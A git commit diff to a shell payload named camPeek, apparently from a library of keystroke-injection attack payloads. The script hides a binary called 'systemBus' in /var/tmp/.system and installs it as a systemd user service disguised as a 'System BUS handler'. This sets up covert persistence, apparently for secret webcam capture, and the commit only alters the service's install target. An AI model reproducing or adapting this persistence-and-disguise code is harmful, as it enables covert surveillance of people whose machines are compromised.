45e4bd1d38ddb69850bf07a36455522b9d106f95
drapl0n <87269662+drapl0n@users.noreply.github.com>
2022-04-14 20:17:28 +0530

    Update payload.sh

--- payloads/library/execution/camPeek/camPeek/payload.sh
+++ payloads/library/execution/camPeek/camPeek/payload.sh
@@ -10,7 +10,7 @@ mkdir /var/tmp/.system/sysLog
 cp -r $mntt/payloads/library/camPeek/systemBus /var/tmp/.system/systemBus
 chmod +x /var/tmp/.system/systemBus
 mkdir -p ~/.config/systemd/user
-echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target" > ~/.config/systemd/user/systemBUS.service
+echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
 systemctl --user daemon-reload
 systemctl --user enable --now systemBUS.service
 systemctl --user start --now systemBUS.service
